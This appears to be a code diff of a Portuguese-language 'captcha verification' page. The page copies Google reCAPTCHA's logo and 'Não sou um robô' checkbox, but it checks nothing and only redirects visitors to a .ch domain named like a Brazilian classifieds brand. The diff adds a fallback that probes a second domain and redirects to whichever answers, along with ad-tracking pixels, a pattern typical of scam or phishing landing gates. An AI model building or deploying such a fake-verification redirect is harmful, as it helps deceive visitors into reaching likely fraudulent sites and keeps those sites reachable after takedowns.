@@ -1,22 +1,22 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificação de Captcha</title>
-    
-			<script>
-				window.googlePixelId = "67dcd04c1fcc6208d10e36cb";
-				var a = document.createElement("script");
-				a.setAttribute("async", "");
-				a.setAttribute("defer", "");
-				a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
-				document.head.appendChild(a);
-			</script>
-			<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
-				data-utmify-prevent-subids async defer></script>
-    <style>
 
+    <script>
+        window.googlePixelId = "67dcd04c1fcc6208d10e36cb";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <style>
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -25,6 +25,7 @@
             height: 100vh;
             background-color: #e9ecef;
         }
+
         .captcha-container {
             background: white;
             padding: 20px;
@@ -33,6 +34,7 @@
             text-align: center;
             width: 300px;
         }
+
         .captcha-box {
             display: flex;
             align-items: center;
@@ -41,19 +43,23 @@
             padding: 10px;
             border-radius: 5px;
         }
+
         .captcha-box img {
             width: 50px;
             height: 50px;
         }
+
         .captcha-text {
             font-size: 18px;
             font-weight: bold;
             color: #333;
         }
+
         input[type="checkbox"] {
             width: 25px;
             height: 25px;
         }
+
         button {
             margin-top: 15px;
             padding: 10px 20px;
@@ -65,20 +71,23 @@
             transition: 0.3s;
             width: 100%;
         }
+
         button:disabled {
             background: #ccc;
             cursor: not-allowed;
         }
     </style>
 </head>
+
 <body>
     <div class="captcha-container">
         <div class="captcha-box">
             <input type="checkbox" id="captcha" onclick="toggleButton()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" alt="Captcha">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png"
+                alt="Captcha">
             <span class="captcha-text">Não sou um robô</span>
         </div>
-        <button id="submitBtn" disabled onclick="redirectToLink()">Enviar</button>
+        <button id="submitBtn" disabled onclick="verificarERedirecionar()   ">Enviar</button>
     </div>
 
     <script>
@@ -87,10 +96,26 @@
             const button = document.getElementById("submitBtn");
             button.disabled = !checkbox.checked;
         }
+    </script>
 
-        function redirectToLink() {
-            window.location.href = "https://bomnegocio.ch";
+    <script>
+        async function verificarERedirecionar() {
+            const dominios = ["https://bomnegocio.ch", "https://negociofechado.ch"];
+
+            for (let dominio of dominios) {
+                try {
+                    const resposta = await fetch(dominio, { method: "HEAD", mode: "no-cors" });
+                    window.location.href = dominio; // Redireciona para o primeiro disponível
+                    return;
+                } catch (erro) {
+                    console.log(`Erro ao acessar ${dominio}, tentando o próximo...`);
+                }
+            }
+
+            alert("Nenhum site está disponível no momento. Já estamos trabalhando Para resolver!!");
         }
     </script>
+
 </body>
+
 </html>
